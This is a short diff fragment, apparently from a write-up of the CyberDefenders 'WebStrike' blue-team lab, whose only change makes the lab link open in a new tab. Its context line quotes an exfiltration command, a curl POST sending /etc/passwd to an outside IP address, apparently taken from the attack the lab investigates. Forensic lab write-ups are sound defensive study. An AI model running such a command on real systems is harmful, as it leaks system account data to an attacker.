@@ -231,4 +231,4 @@ curl -X POST -d /etc/passwd http://117.11.88.124:443/
 
 # Try This Lab Yourself {#try-this-lab-yourself}
 
-🔗 Lab Link: [CyberDefenders: WebStrike](https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/)
+🔗 Lab Link: [CyberDefenders: WebStrike](https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/){:target="\_blank"}
